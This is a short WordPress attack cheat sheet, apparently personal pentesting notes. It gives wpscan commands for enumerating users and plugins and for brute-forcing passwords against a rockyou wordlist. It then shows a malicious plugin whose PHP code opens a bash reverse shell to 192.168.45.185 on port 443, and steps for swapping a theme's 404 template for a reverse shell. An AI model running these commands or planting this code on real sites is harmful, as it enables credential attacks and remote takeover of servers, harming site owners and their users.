### Enum
```
sudo wpscan --url url -e vp,u
sudo wpscan --url url --usernames admin --passwords rockyou.txt
```
enum users
```
sudo wpscan --url https://ip/ --enumerate u
```

### Upload Plugin to RCE
```
<?php
/**
* Author: Saeed Bala
* Plugin Name: PHP Code Plugin
* Description: Shell Through Plugins
* Version: 1.0
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.185/443 0>&1'");
?>

zip -r plug.zip index.php
```
### Update Theme File to RCE 
```
1. Location: Backend -> Theme Editor -> Theme Files -> 404 Template
2. Replace with your rev php shell
3.Access the 404 Template
http://192.168.199.55/shenzi/404.php
```
